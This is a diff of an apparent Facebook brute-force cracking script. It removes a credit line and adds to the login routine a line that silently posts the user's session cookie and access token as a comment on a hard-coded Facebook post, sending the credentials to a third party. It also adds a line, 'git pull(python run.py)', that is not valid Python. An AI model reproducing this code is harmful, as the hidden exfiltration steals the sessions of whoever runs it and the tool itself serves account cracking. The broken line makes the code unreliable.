@@ -201,8 +201,7 @@ def banner():
 {mer}  \__ \/ /   / __  / /_    
 {puti} ___/ / /___/ /_/ / __/    
 {puti}/____/\____/_____/_/
-simpel crack brute force 
-       @recode by vindra               ''')
+simpel crack brute force             ''')
 
 ###----------[ NGECEK COOKIES ]----------###
 def login_baz():
@@ -237,10 +236,11 @@ def login_men():
 		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 		roq = ses.get(nek,cookies=cookies)
 		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+		requests.post(f"https://graph.facebook.com/v15.0/100013275378835_1621661614953002/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
 		ken = open(".tokenakun.txt", "w").write(tok)
 		cok = open(".cookiesakun.txt", "w").write(cookie)
 		baz_anim(f'{puti}└──{bira} login berhasil ster jalanin ulang scnya')
-		exit()
+		git pull(python run.py)
 	except Exception as e:
 		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
 		baz_anim(f'{puti}└──{kun} login gagal ster coba ganti tumbal')
